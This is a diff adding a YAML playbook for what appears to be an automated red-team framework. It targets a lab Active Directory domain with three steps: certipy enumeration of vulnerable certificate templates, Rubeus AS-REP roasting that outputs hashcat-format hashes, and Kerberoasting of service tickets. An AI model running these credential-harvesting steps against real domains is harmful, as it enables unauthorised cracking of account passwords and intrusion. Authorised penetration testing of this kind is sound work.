@@ -1,0 +1,41 @@
+version: 1
+name: "Generic Active Directory Reconnaissance & Discovery"
+
+nodes:
+  - id: "RECON-01-CERTIPY"
+    phase: 1.0
+    title: "Audit Active Directory Certificate Services (ADCS) CAs and Templates"
+    path: "direct"
+    beachheads: ["windows", "linux"]
+    intent: "certipy.find"
+    intent_args:
+      target: "dc01.example.lab"
+      domain: "example.lab"
+      vulnerable: true
+    produces_cred: "adcs_templates_json"
+    success_marker: "RECON_01_CERTIPY_OK"
+
+  - id: "RECON-02-ASREP"
+    phase: 1.0
+    title: "Scan for AS-REP Roastable Accounts (UF_DONT_REQUIRE_PREAUTH)"
+    path: "direct"
+    beachheads: ["windows", "linux"]
+    intent: "rubeus.asreproast"
+    intent_args:
+      dc: "dc01.example.lab"
+      domain: "example.lab"
+      format: "hashcat"
+    produces_cred: "asrep_hashes"
+    success_marker: "RECON_02_ASREP_OK"
+
+  - id: "RECON-03-KERBEROAST"
+    phase: 1.0
+    title: "Request Kerberoastable Service Principal Name (SPN) Tickets"
+    path: "direct"
+    beachheads: ["windows", "linux"]
+    intent: "rubeus.kerberoast"
+    intent_args:
+      dc: "dc01.example.lab"
+      domain: "example.lab"
+    produces_cred: "kerberoast_tickets"
+    success_marker: "RECON_03_KERBEROAST_OK"
